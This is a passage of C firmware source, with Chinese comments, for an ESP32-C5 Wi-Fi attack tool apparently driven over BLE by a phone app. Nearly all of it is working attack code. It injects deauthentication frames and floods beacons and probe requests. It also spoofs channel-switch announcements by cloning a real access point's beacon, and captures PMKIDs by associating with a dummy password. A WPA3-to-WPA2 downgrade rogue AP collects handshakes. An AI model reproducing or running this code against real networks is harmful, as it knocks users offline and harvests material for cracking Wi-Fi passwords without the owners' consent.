     * fetch_sub 返回旧值; 旧值==1 表示这是最后一包. */
    uint32_t rem = atomic_load(&s_sniff_remaining);
    if (rem > 0 && rem != UINT32_MAX) {
        uint32_t old = atomic_fetch_sub(&s_sniff_remaining, 1);
        if (old == 1) {
            /* 标记停止中, 阻止后续回调继续处理 */
            atomic_store(&s_state, WIFI_ATK_IDLE);
            /* 不能在回调里关 promiscuous (会和驱动打架), 只投递令牌 */
            sniff_request_stop();
        }
    }
    (void)total;
}


static void inject_task(void *pv)
{
    inject_args_t *a = (inject_args_t *)pv;
    uint8_t frame[RFTOOL_MAX_FRAME_LEN];
    uint32_t sent = 0, errs = 0;
    uint32_t backoff_ms = 0;
    TickType_t t_start = xTaskGetTickCount();
    TickType_t led_next = 0;
    WDT_ADD();

    if (a->channel && is_valid_channel(a->channel)) {
        esp_wifi_set_channel(a->channel, WIFI_SECOND_CHAN_NONE);
        atomic_store(&s_sniff_channel, a->channel);
    }

    while (!atomic_load(&s_inject_stop)) {
        if (a->count && sent >= a->count) break;

        int len = -1;
        if (a->mode == INJECT_DEAUTH) {
            bool broadcast = (a->sta[0]|a->sta[1]|a->sta[2]|a->sta[3]|a->sta[4]|a->sta[5]) == 0;
            if (broadcast) {
                uint8_t bc[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
                len = mk_deauth_frame(frame, a->bssid, bc, true, a->reason);
            } else {
                len = mk_deauth_frame(frame, a->bssid, a->sta, true, a->reason);
                uint8_t f2[26];
                int l2 = mk_deauth_frame(f2, a->bssid, a->sta, false, a->reason);
                esp_wifi_80211_tx(WIFI_IF_STA, f2, l2, true);
            }
        } else if (a->mode == INJECT_BEACON) {
            uint8_t src[6];
            /* 必须走 fb_random_local_mac: 裸 esp_fill_random 有一半概率把
             * 首字节最低位置 1, 那是多播地址, 客户端会当成坏帧丢掉. */
            fb_random_local_mac(src);
            char ssid[40];
            uint32_t rnd = (uint32_t)esp_random();
            snprintf(ssid, sizeof(ssid), "%s%u", a->ssid_prefix, (unsigned)(rnd % 10000));
            uint32_t tsf = (uint32_t)(esp_timer_get_time() & 0xffffffff);
            len = mk_beacon_frame(frame, sizeof(frame), src, tsf, 100, a->channel, ssid);
        } else {
            uint8_t src[6];
            fb_random_local_mac(src);
            len = mk_probe_req_frame(frame, sizeof(frame), src, NULL);
        }

        if (len > 0) {
            esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, frame, len, true);
            if (e == ESP_OK) {
                sent++;
                atomic_store(&s_inject_total, sent);
                backoff_ms = 0;
            } else {
                errs++;
                /* 驱动发送队列满时继续硬打只会连续失败, 让出 50ms 让它排空 */
                if (e == ESP_ERR_NO_MEM || e == ESP_ERR_INVALID_STATE) backoff_ms = 50;
                /* 只报前 3 次与每 100 次, 否则错误会把串口和 BLE 通道刷满 */
                if (errs <= 3 || (errs % 100) == 0) {
                    raw_out("META,WIFI,INJECT,ERR,code,%d,name,%s,total,%u\n",
                            (int)e, esp_err_to_name(e), (unsigned)errs);
                }
            }
            /* WS2812 编码要占 CPU, 每帧刷一次在 50fps 下没有必要 */
            TickType_t now = xTaskGetTickCount();
            if (now >= led_next) {
                rgb_led_event(RGB_EV_TX_OK, 50);
                led_next = now + pdMS_TO_TICKS(100);
            }
        }

        uint32_t wait = a->interval_ms ? a->interval_ms : 20;
        if (backoff_ms > wait) wait = backoff_ms;
        vTaskDelay(pdMS_TO_TICKS(wait));
        WDT_RESET();
    }

    uint32_t elapsed = (uint32_t)((xTaskGetTickCount() - t_start) * portTICK_PERIOD_MS);
    atomic_store(&s_state, WIFI_ATK_IDLE);
    rgb_led_set_status(RGB_IDLE);
    /* stopped=1 表示它不是自己跑完的, 而是被 stop / 被新任务顶掉的.
     * 少了这个字段, 收到的"完成 sent=50"和正常的跑完一模一样. */
    raw_out("META,WIFI,INJECT,DONE,mode,%d,sent,%u,err,%u,ms,%u,stopped,%u\n",
            (int)a->mode, (unsigned)sent, (unsigned)errs, (unsigned)elapsed,
            atomic_load(&s_inject_stop) ? 1u : 0u);

    /* 栈水位: 4096 字节的栈够不够, 用实测数字说话, 不靠估. */
    UBaseType_t hwm = uxTaskGetStackHighWaterMark(NULL);
    raw_out("META,WIFI,INJECT,STACK,free_min,%u\n", (unsigned)hwm);

    free(a);
    WDT_DEL();
    atomic_store(&s_inject_running, false);
    vTaskDelete(NULL);
}


/* 停止所有正在运行的功能 (sniff + inject + downgrade).
 * 任何 _start 函数内部都会先调用此函数实现"启动一个就停其他".
 * 安全可重复调用, 返回 ESP_OK 表示至少停了一个功能. */
esp_err_t wifi_attack_stop_all(void)
{
    bool stopped_any = false;

    /* 按句柄判断而不是只看状态: 注入任务收尾时会先把 state 置 IDLE,
     * 再删自己, 这中间的空档按状态判断会漏掉这次停止. */
    if (atomic_load(&s_inject_running)) {
        atomic_store(&s_inject_stop, true);
        for (int i = 0; i < 300 && atomic_load(&s_inject_running); i++) {
            vTaskDelay(pdMS_TO_TICKS(10));
        }
        stopped_any = true;
    }

    wifi_atk_state_t st = atomic_load(&s_state);

    if (st == WIFI_ATK_DOWNGRADE) {
        atomic_store(&s_channel_rotate, false);
        esp_wifi_set_promiscuous(false);
        http_server_stop();
        atomic_store(&s_state, WIFI_ATK_IDLE);
        stopped_any = true;
    } else if (st == WIFI_ATK_SNIFF) {
        sniff_stop_common();
        atomic_store(&s_state, WIFI_ATK_IDLE);
        stopped_any = true;
    } else {
        if (atomic_load(&s_channel_rotate)) {
            atomic_store(&s_channel_rotate, false);
        }
        esp_wifi_set_promiscuous(false);
    }

    if (stopped_any) {
        rgb_led_set_status(RGB_IDLE);
    }
    return stopped_any ? ESP_OK : ESP_ERR_INVALID_STATE;
}

esp_err_t wifi_attack_init(void)
{
    if (!s_stop_sem) {
        s_stop_sem = xSemaphoreCreateBinary();
        ESP_RETURN_ON_FALSE(s_stop_sem, ESP_ERR_NO_MEM, TAG, "stop sem create");
        xTaskCreate(sniff_stopper_task, "snifstop", 3072, NULL, 6, NULL);
    }

    esp_err_t err = nvs_flash_init();
    if (err == ESP_ERR_NVS_NO_FREE_PAGES || err == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_RETURN_ON_ERROR(nvs_flash_erase(), TAG, "nvs erase");
        err = nvs_flash_init();
    }
    ESP_RETURN_ON_ERROR(err, TAG, "nvs init");

    ESP_RETURN_ON_ERROR(esp_netif_init(), TAG, "netif init");
    ESP_RETURN_ON_ERROR(esp_event_loop_create_default(), TAG, "event loop");
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_RETURN_ON_ERROR(esp_wifi_init(&cfg), TAG, "wifi init");
    ESP_RETURN_ON_ERROR(esp_wifi_set_mode(WIFI_MODE_STA), TAG, "set mode STA");
    ESP_RETURN_ON_ERROR(esp_wifi_start(), TAG, "wifi start");
    esp_wifi_set_ps(WIFI_PS_NONE);   /* 关省电, 减少 tx 抖动 */

    /* 启用 2.4G + 5G 双频模式 (ESP32-C5 原生支持).
     * WIFI_BAND_MODE_AUTO 允许在 1-14 (2.4G) 与 36-165 (5G) 信道间切换. */
    esp_err_t band_err = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
    if (band_err != ESP_OK) {
        ESP_LOGW(TAG, "set band_mode AUTO failed: %s (fallback 2.4G only)",
                 esp_err_to_name(band_err));
    } else {
        /* 双频协议: 2.4G=b/g/n/ax, 5G=a/n/ac/ax */
        wifi_protocols_t protos = {
            .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AX,
            .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
        };
        esp_err_t perr = esp_wifi_set_protocols(WIFI_IF_STA, &protos);
        if (perr != ESP_OK) {
            ESP_LOGW(TAG, "set protocols failed: %s", esp_err_to_name(perr));
        }
        ESP_LOGI(TAG, "5GHz dual-band enabled (2.4G b/g/n/ax + 5G a/n/ac/ax)");
    }

    wifi_db_init();
    ESP_LOGI(TAG, "Wi-Fi init ok (STA, PS_NONE)");
    rgb_led_set_status(RGB_IDLE);
    return ESP_OK;
}

/* CSA: 在驱动任务里只做一次 memcpy, 不能在这里解析或打印 */
static uint8_t        s_csa_frame[RFTOOL_MAX_FRAME_LEN];
static volatile int   s_csa_len = 0;
static uint8_t        s_csa_want[6];

static void csa_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (s_csa_len || !buf || type == WIFI_PKT_MISC) return;
    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
    if (p->rx_ctrl.rx_state != 0) return;
    int len = p->rx_ctrl.sig_len - 4;
    if (len < 36 || len > RFTOOL_MAX_FRAME_LEN) return;
    const uint8_t *f = p->payload;
    if (((f[0] >> 2) & 0x3) != 0) return;
    if (((f[0] >> 4) & 0xF) != 0x8) return;              /* 只要 beacon */
    if (memcmp(f + 16, s_csa_want, 6) != 0) return;      /* addr3 = BSSID */
    memcpy(s_csa_frame, f, len);
    s_csa_len = len;
}

esp_err_t wifi_attack_csa(const uint8_t bssid[6], const char *ssid_fallback,
                          uint8_t ch, uint8_t new_ch, uint8_t count, bool dry,
                          csa_result_t *res)
{
    if (!bssid || !res) return ESP_ERR_INVALID_ARG;
    memset(res, 0, sizeof(*res));
    if (!is_valid_channel(ch) || !is_valid_channel(new_ch)) return ESP_ERR_INVALID_ARG;
    if (count == 0) count = 3;

    wifi_attack_stop_all();
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) return ESP_ERR_INVALID_STATE;

    esp_err_t e = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (e != ESP_OK) return e;
    atomic_store(&s_sniff_channel, ch);

    /* 先在空中抓一份真实 beacon: 客户端会比对 BSSID 与 RSN, 拿真帧改比
     * 凭空合成可靠. 抓不到才退到合成 (开放网络或 SSID 已知时也够用). */
    memcpy(s_csa_want, bssid, 6);
    s_csa_len = 0;
    esp_wifi_set_promiscuous_rx_cb(csa_rx_cb);
    esp_wifi_set_promiscuous(true);
    TickType_t t0 = xTaskGetTickCount();
    while (s_csa_len == 0 && (xTaskGetTickCount() - t0) < pdMS_TO_TICKS(800)) {
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    esp_wifi_set_promiscuous(false);

    int len;
    if (s_csa_len > 0) {
        len = s_csa_len;
        memcpy(res->bytes, s_csa_frame, (size_t)len);
        res->cloned = true;
    } else {
        if (!ssid_fallback || !ssid_fallback[0]) return ESP_ERR_NOT_FOUND;
        len = fb_beacon(res->bytes, sizeof(res->bytes), bssid,
                        (const uint8_t *)ssid_fallback, (int)strlen(ssid_fallback), ch);
        if (len <= 0) return ESP_FAIL;
    }

    int base = fb_append_csa(res->bytes, len, (int)sizeof(res->bytes), new_ch, count);
    if (base <= 0) return ESP_ERR_INVALID_SIZE;
    res->len = base;

    if (dry) return ESP_OK;

    for (int i = 0; i < count; i++) {
        int cd = count - i;
        if (cd < 1) cd = 1;
        res->bytes[base - 1] = (uint8_t)cd;      /* CSA 的 countdown 是 IE 最后一字节 */
        e = esp_wifi_80211_tx(WIFI_IF_STA, res->bytes, base, true);
        if (e == ESP_OK) res->sent++;
        else             res->fail++;
        vTaskDelay(pdMS_TO_TICKS(100));
    }
    return res->sent ? ESP_OK : ESP_FAIL;
}

esp_err_t wifi_attack_pmkid_active(const uint8_t bssid[6], const char *ssid,
                                   uint8_t ch, uint32_t timeout_ms,
                                   int *m1_out, int *pmkid_out)
{
    if (!bssid || !ssid || !ssid[0]) return ESP_ERR_INVALID_ARG;
    if (!is_valid_channel(ch)) return ESP_ERR_INVALID_ARG;

    wifi_attack_stop_all();
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) return ESP_ERR_INVALID_STATE;

    esp_err_t e = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (e != ESP_OK) return e;
    atomic_store(&s_sniff_channel, ch);

    wifi_config_t cfg;
    memset(&cfg, 0, sizeof(cfg));
    snprintf((char *)cfg.sta.ssid, sizeof(cfg.sta.ssid), "%s", ssid);
    /* 口令随便填, 只要长度过 8: supplicant 在本地就校验长度, 太短根本不发 assoc.
     * PMKID 在 AP 发来的 M1 的 KDE 里, 不需要我们算对 MIC. */
    snprintf((char *)cfg.sta.password, sizeof(cfg.sta.password), "%s", "rftool-pmkid-0000");
    cfg.sta.bssid_set = 1;
    memcpy(cfg.sta.bssid, bssid, 6);
    cfg.sta.channel = ch;
    cfg.sta.pmf_cfg.capable  = true;
    cfg.sta.pmf_cfg.required = false;

    e = esp_wifi_set_config(WIFI_IF_STA, &cfg);
    if (e != ESP_OK) return e;

    int before = hs_count();
    int before_pmkid = hs_pmkid_count();

    atomic_store(&s_state, WIFI_ATK_PMKID);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
    esp_wifi_set_promiscuous(true);

    e = esp_wifi_connect();
    if (e != ESP_OK) {
        esp_wifi_set_promiscuous(false);
        atomic_store(&s_state, WIFI_ATK_IDLE);
        return e;
    }

    TickType_t t0 = xTaskGetTickCount();
    while ((xTaskGetTickCount() - t0) < pdMS_TO_TICKS(timeout_ms)) {
        if (hs_pmkid_count() > before_pmkid) break;    /* 拿到就不用等满 */
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    esp_wifi_disconnect();
    vTaskDelay(pdMS_TO_TICKS(150));   /* 最后一帧可能还在驱动队列里 */
    esp_wifi_set_promiscuous(false);
    atomic_store(&s_state, WIFI_ATK_IDLE);

    if (m1_out)    *m1_out    = hs_count() - before;
    if (pmkid_out) *pmkid_out = hs_pmkid_count() - before_pmkid;
    return (hs_count() > before) ? ESP_OK : ESP_ERR_TIMEOUT;
}

esp_err_t wifi_attack_sniff_start(uint8_t channel, uint32_t count)
{
    /* 互斥: 自动停其他功能 (inject / downgrade) */
    wifi_attack_stop_all();
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
        return ESP_ERR_INVALID_STATE;
    }
    if (!is_valid_channel(channel)) return ESP_ERR_INVALID_ARG;

    /* 等上一次的停止令牌落地再开: 否则" 计数嗅探到数自动停" 紧接着再开,
     * 迟到的 stopper 会把这一次刚打开的 promiscuous 关掉. */
    sniff_stop_barrier();

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    /* 注意: 这里不再 wifi_db_clear().
     * App 的扫描流程是 sniff -> stop -> dump, 靠嗅探期累积的表出结果;
     * 若在 start 时清表, 用户点「仅刷新/重新扫描」时上一轮的 AP/客户端
     * 会被瞬间抹掉, dump 出来就是空的 (表现为「扫不出来」). 清表交给
     * 显式的 `dump clear` / `scan clear`, 语义更清晰.
     * 计数仍归零, 便于本轮统计. */
    atomic_store(&s_sniff_channel, channel);
    /* count=0 -> 永续: 用 UINT32_MAX 占位 (回调里 !=UINT32_MAX 才递减, 故永不动) */
    atomic_store(&s_sniff_remaining, count ? count : UINT32_MAX);
    atomic_store(&s_sniff_total, 0);
    atomic_store(&s_state, WIFI_ATK_SNIFF);
    rgb_led_set_status(RGB_SNIFF_SINGLE);
    sniff_progress_start();

    printf("META,WIFI,SNIFF,START,channel,%u,count,%lu\n",
           channel, (unsigned long)(count ? count : 0xFFFFFFFFUL));
    fflush(stdout);
    return ESP_OK;
}



static esp_err_t inject_start_common(inject_args_t *a)
{
    /* 互斥: 自动停其他功能 (sniff / downgrade).
     * 同时也会顶掉正在跑的注入 (新的接管). 顶替必须留痕, 否则上一个
     * 作业在日志里就是一句普通的"完成 sent=N", 看不出是被换掉的. */
    if (atomic_load(&s_inject_running)) {
        printf("META,WIFI,INJECT,SUPERSEDED,mode,%d\n", (int)a->mode);
        fflush(stdout);
    }
    wifi_attack_stop_all();
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
        free(a);
        return ESP_ERR_INVALID_STATE;
    }
    {
        bool expected = false;
        if (!atomic_compare_exchange_strong(&s_inject_running, &expected, true)) {
            free(a);
            return ESP_ERR_TIMEOUT;
        }
    }
    atomic_store(&s_inject_stop, false);
    atomic_store(&s_inject_total, 0);
    atomic_store(&s_state, WIFI_ATK_INJECT);
    const char *mode_name = (a->mode == INJECT_DEAUTH) ? "deauth" :
                            (a->mode == INJECT_BEACON) ? "beacon" : "probe";
    switch (a->mode) {
        case INJECT_DEAUTH: rgb_led_set_status(RGB_INJECT_DEAUTH); break;
        case INJECT_BEACON: rgb_led_set_status(RGB_INJECT_BEACON); break;
        case INJECT_PROBE:  rgb_led_set_status(RGB_INJECT_PROBE);  break;
    }
    /* 立即回执, 让 App 知道任务已启动 (在 cli 捕获窗口内, 会经 BLE 回传) */
    printf("META,WIFI,INJECT,START,mode,%s,count,%lu,interval,%lu,channel,%u\n",
           mode_name, (unsigned long)a->count, (unsigned long)a->interval_ms,
           (unsigned)a->channel);
    fflush(stdout);

    BaseType_t r = xTaskCreate(inject_task, "inject", 4096, a, 5, NULL);
    if (r != pdPASS) {
        atomic_store(&s_state, WIFI_ATK_IDLE);
        atomic_store(&s_inject_running, false);
        rgb_led_set_status(RGB_IDLE);
        free(a);
        return ESP_FAIL;
    }
    return ESP_OK;
}

esp_err_t wifi_attack_deauth_start(const uint8_t bssid[6], const uint8_t sta[6],
                                   uint32_t count, uint16_t reason, uint32_t interval_ms)
{
    if (!bssid) return ESP_ERR_INVALID_ARG;
    inject_args_t *a = calloc(1, sizeof(*a));
    ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
    a->mode = INJECT_DEAUTH;
    memcpy(a->bssid, bssid, 6);
    if (sta) memcpy(a->sta, sta, 6);   /* NULL -> 全 0 = 广播 deauth */
    a->reason = reason;
    a->count = count;
    a->interval_ms = interval_ms;
    return inject_start_common(a);
}

esp_err_t wifi_attack_beacon_flood_start(const char *prefix, uint32_t count,
                                        uint32_t interval_ms, uint8_t channel)
{
    if (!prefix || !prefix[0]) return ESP_ERR_INVALID_ARG;
    inject_args_t *a = calloc(1, sizeof(*a));
    ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
    a->mode = INJECT_BEACON;
    strncpy(a->ssid_prefix, prefix, sizeof(a->ssid_prefix) - 1);
    if (channel && is_valid_channel(channel)) {
        a->channel = channel;
    } else {
        uint8_t ch = atomic_load(&s_sniff_channel);
        a->channel = ch ? ch : 6;
    }
    a->count = count;
    a->interval_ms = interval_ms;
    return inject_start_common(a);
}

esp_err_t wifi_attack_probe_flood_start(uint32_t count, uint32_t interval_ms)
{
    inject_args_t *a = calloc(1, sizeof(*a));
    ESP_RETURN_ON_FALSE(a, ESP_ERR_NO_MEM, TAG, "no mem");
    a->mode = INJECT_PROBE;
    a->count = count;
    a->interval_ms = interval_ms;
    return inject_start_common(a);
}

esp_err_t wifi_attack_inject_stop(void)
{
    if (!atomic_load(&s_inject_running)) {
        return ESP_ERR_INVALID_STATE;
    }
    atomic_store(&s_inject_stop, true);
    for (int i = 0; i < 300 && atomic_load(&s_inject_running); i++) {
        vTaskDelay(pdMS_TO_TICKS(10));
    }
    return atomic_load(&s_inject_running) ? ESP_ERR_TIMEOUT : ESP_OK;
}

void wifi_attack_set_auto_policy(int policy)
{
    atomic_store(&s_auto_policy, policy ? AUTO_POLICY_PSD : AUTO_POLICY_WRL);
}

int wifi_attack_get_auto_policy(void)
{
    return atomic_load(&s_auto_policy) == AUTO_POLICY_PSD ? 1 : 0;
}

esp_err_t wifi_attack_sniff_auto_start(uint32_t dwell_ms, uint32_t count)
{
    /* 互斥: 自动停其他功能 (inject / downgrade) */
    wifi_attack_stop_all();
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
        return ESP_ERR_INVALID_STATE;
    }
    if (dwell_ms < 100) dwell_ms = 100;

    /* 同上: 起新会话前先把在飞的停止令牌等落地 */
    sniff_stop_barrier();

    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
    esp_wifi_set_promiscuous(true);

    /* 同 wifi_attack_sniff_start: 不清表. App 走 sniff -> stop -> dump,
     * start 时清表会让随后的 dump 拿到空结果. */
    atomic_store(&s_dwell_ms, dwell_ms);
    atomic_store(&s_channel_rotate, true);
    /* 轮询嗅探也支持 -n 计数: 之前 CLI 解析出了 -n 却直接丢弃 (void)cnt,
     * 用户敲 `sniff auto -n 200` 以为到数会停, 实际一直跑到手停. */
    atomic_store(&s_sniff_remaining, count ? count : UINT32_MAX);
    atomic_store(&s_sniff_total, 0);
    /* 每次 auto 启动清空发现计数, 上一次作业的发现不能算到这一次头上 */
    for (int i = 0; i <= CH_IDX_MAX; i++) {
        atomic_store(&s_ch_hits[i], 0);
        atomic_store(&s_ch_found[i], 0);
        atomic_store(&s_ch_visits[i], 0);
        atomic_store(&s_ch_listen[i], 0);
    }
    atomic_store(&s_ch_hits_total, 0);
    atomic_store(&s_ch_found_total, 0);
    atomic_store(&s_rate_mean, 0);
    atomic_store(&s_auto_round, 0);
    atomic_store(&s_auto_dwell_now, dwell_ms);
    atomic_store(&s_state, WIFI_ATK_SNIFF);
    rgb_led_set_status(RGB_SNIFF_AUTO);
    sniff_progress_start();

    uint32_t rg = (uint32_t)atomic_fetch_add(&s_rotate_gen, 1) + 1;
    BaseType_t r = xTaskCreate(channel_rotate_task, "chrot", 2048,
                               (void *)(uintptr_t)rg, 5, NULL);
    if (r != pdPASS) {
        atomic_store(&s_state, WIFI_ATK_IDLE);
        atomic_store(&s_channel_rotate, false);
        esp_wifi_set_promiscuous(false);
        sniff_progress_stop();
        rgb_led_set_status(RGB_IDLE);
        return ESP_FAIL;
    }

    printf("META,WIFI,SNIFF,AUTO,START,dwell_ms,%u,adaptive,%u,policy,%s\n",
           (unsigned)dwell_ms, atomic_load(&s_auto_adaptive) ? 1u : 0u,
           atomic_load(&s_auto_policy) == AUTO_POLICY_PSD ? "psd" : "wrl");
    event_publish("WIFI", "sniff auto start dwell=%u", (unsigned)dwell_ms);
    fflush(stdout);
    return ESP_OK;
}

static void sniff_stop_common(void)
{
    /* 先等还在收尾的 stopper 落地, 再原子地把令牌收走.
     * 令牌收到 0 之后 stopper 再被唤醒会直接跳过, 于是 DONE 只有一份. */
    sniff_stop_barrier();
    atomic_store(&s_stop_state, 0);

    if (atomic_load(&s_channel_rotate)) {
        atomic_store(&s_channel_rotate, false);
    }
    sniff_progress_stop();
    /* Directly disable promiscuous - safe from any task context.
     * The callback checks s_state != SNIFF and returns early,
     * so there's no race even if a packet is being processed. */
    esp_wifi_set_promiscuous(false);

    /* DONE 从命令上下文发出: 走 raw_out 而不是 printf, 这样从编排任务等
     * 非命令上下文调用时也能送到手机 (raw_out 自带 BLE 事件投递). */
    raw_out("META,WIFI,SNIFF,DONE,total,%u\n", (unsigned)atomic_load(&s_sniff_total));
}

esp_err_t wifi_attack_sniff_stop(void)
{
    /* If definitely not sniffing, bail fast. But also handle the race where
     * state shows IDLE but promiscuous is still on (e.g. callback just set
     * IDLE but hasn't disabled promisc yet). */
    wifi_atk_state_t st = atomic_load(&s_state);
    if (st != WIFI_ATK_SNIFF) {
        /* Defensive: force-close promiscuous regardless of state */
        if (atomic_load(&s_channel_rotate)) {
            atomic_store(&s_channel_rotate, false);
        }
        sniff_progress_stop();
        esp_wifi_set_promiscuous(false);
        return ESP_ERR_INVALID_STATE;
    }
    sniff_stop_common();
    atomic_store(&s_state, WIFI_ATK_IDLE);
    return ESP_OK;
}

void wifi_attack_status(void)
{
    wifi_atk_state_t st = atomic_load(&s_state);
    const char *stname = (st == WIFI_ATK_SNIFF)      ? "SNIFF"     :
                         (st == WIFI_ATK_INJECT)     ? "INJECT"    :
                         (st == WIFI_ATK_DOWNGRADE)  ? "DOWNGRADE" :
                         (st == WIFI_ATK_PMKID)      ? "PMKID"     : "IDLE";
    bool auto_ch = atomic_load(&s_channel_rotate);
    uint8_t mac[6] = {0};
    char macs[18] = "-";
    if (esp_wifi_get_mac(WIFI_IF_STA, mac) == ESP_OK) mac_to_str(mac, macs);
    /* tasks: 当前任务数. 它是任务泄漏类缺陷的唯一可观测指标:
     * 进度任务 / 信道轮询任务一旦在" 停→立刻再开" 时重复起来, 任务数会
     * 逐轮累加, 别的读数(META 行、堆)全都看不出来. */
    printf("META,WIFI,STATUS,state,%s,channel,%u,auto_ch,%u,sniff_total,%u,"
           "inject_total,%u,aps,%u,clients,%u,eapols,%u,mtu,%u,ble,%u,phy,%u,tasks,%u,"
           "sta_mac,%s\n",
           stname,
           (unsigned)atomic_load(&s_sniff_channel),
           auto_ch ? 1u : 0u,
           (unsigned)atomic_load(&s_sniff_total),
           (unsigned)atomic_load(&s_inject_total),
           (unsigned)wifi_db_ap_count(),
           (unsigned)wifi_db_client_count(),
           (unsigned)wifi_db_eapol_count(),
           (unsigned)ble_cli_mtu(), ble_cli_connected() ? 1u : 0u,
           (unsigned)ble_cli_phy(),
           (unsigned)uxTaskGetNumberOfTasks(), macs);
    if (auto_ch) wifi_attack_auto_dump();
    fflush(stdout);
}

/* 统计输出: 自适应轮询把时间花在哪些信道上
 * 只在 auto 模式且已有命中时输出, 最多 8 行, 供串口 / App 观察调度是否合理.
 * 用局部快照排序, 绝不改动统计本身 (否则下一次调度就被污染). */
void wifi_attack_auto_dump(void)
{
    uint32_t total = atomic_load(&s_ch_hits_total);
    if (total == 0) return;

    uint32_t base = atomic_load(&s_dwell_ms);
    uint32_t fair = total / (uint32_t)(N_CH_2G + N_CH_5G);
    if (fair == 0) fair = 1;

    printf("META,WIFI,AUTO,STATS,round,%u,total_hits,%u,dwell_now,%u,base,%u\n",
           (unsigned)atomic_load(&s_auto_round), (unsigned)total,
           (unsigned)atomic_load(&s_auto_dwell_now), (unsigned)base);

    enum { TOPN = 8 };
    int      top_ch[TOPN];
    uint32_t top_v[TOPN];
    int      top_n = 0;

    for (int i = 1; i <= CH_IDX_MAX; i++) {
        uint32_t v = (uint32_t)atomic_load(&s_ch_hits[i]);
        if (v < fair) continue;                 /* 低于平均份额的不报 */
        /* 插入有序表 (最多 8 项, O(TOPN) 足够) */
        if (top_n < TOPN) {
            int p = top_n++;
            while (p > 0 && top_v[p - 1] < v) { top_v[p] = top_v[p - 1]; top_ch[p] = top_ch[p - 1]; p--; }
            top_v[p] = v; top_ch[p] = i;
        } else if (v > top_v[TOPN - 1]) {
            int p = TOPN - 1;
            while (p > 0 && top_v[p - 1] < v) { top_v[p] = top_v[p - 1]; top_ch[p] = top_ch[p - 1]; p--; }
            top_v[p] = v; top_ch[p] = i;
        }
    }

    for (int i = 0; i < top_n; i++) {
        printf("META,WIFI,AUTO,CH,%d,hits,%u,dwell,%u,found,%u\n",
               top_ch[i], (unsigned)top_v[i],
               (unsigned)((atomic_load(&s_auto_policy) == AUTO_POLICY_PSD)
                          ? auto_dwell_psd((uint8_t)top_ch[i], base)
                          : auto_dwell_for((uint8_t)top_ch[i], base)),
               (unsigned)atomic_load(&s_ch_found[top_ch[i]]));
    }
}


/* WPA3 -> WPA2 Downgrade AP */

esp_err_t wifi_attack_downgrade_start(const char *ssid, const char *pass)
{
    if (!ssid || !*ssid) return ESP_ERR_INVALID_ARG;

    /* 互斥: 停其他功能 (sniff / inject) */
    wifi_attack_stop_all();
    if (atomic_load(&s_state) != WIFI_ATK_IDLE) {
        return ESP_ERR_INVALID_STATE;
    }

    /* 启动 SoftAP (WPA2-PSK only).
     * ESP32-C5 SoftAP 不支持 WPA3-SAE, 天然是 WPA2-only AP.
     * WPA3-Transition 客户端看到 SSID 后会尝试 WPA3-SAE, 失败后降级走 WPA2-PSK
     * 4-way handshake, 我们抓 EAPOL 存 wifi_db. */
    esp_err_t e = http_server_start(ssid, pass);
    if (e != ESP_OK) return e;

    /* 起新会话前把在飞的停止令牌等落地 */
    sniff_stop_barrier();

    /* 开 promiscuous 抓 EAPOL 4-way handshake (仅 DATA 帧, 减少噪声) */
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA,
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(wifi_sniff_cb);
    esp_wifi_set_promiscuous(true);

    /* 降级抓握手是永续的: 必须把上一轮" 计数嗅探" 剩下的 s_sniff_remaining
     * 冲成永续. 否则上次 `sniff -n 50` 中途被用户停掉(还剩 30)接着开降级,
     * 收到 30 包后回调判定到数, 把降级的抓包悄悄停了. SoftAP 还亮着,
     * 但 EAPOL 一条都收不到, 现象是" 降级跑起来却抓不到握手". */
    atomic_store(&s_sniff_remaining, UINT32_MAX);
    atomic_store(&s_state, WIFI_ATK_DOWNGRADE);
    rgb_led_set_status(RGB_SNIFF_AUTO);   /* 复用 auto 状态, 后续可加专用状态 */

    printf("META,WIFI,DOWNGRADE,START,ssid,%s\n", ssid);
    fflush(stdout);
    return ESP_OK;
}

esp_err_t wifi_attack_downgrade_stop(void)
{
    if (atomic_load(&s_state) != WIFI_ATK_DOWNGRADE) {
        return ESP_ERR_INVALID_STATE;
    }

    /* 关 promiscuous */
    esp_wifi_set_promiscuous(false);

    /* 关 SoftAP + HTTP server, 切回 STA */
    http_server_stop();

    atomic_store(&s_state, WIFI_ATK_IDLE);
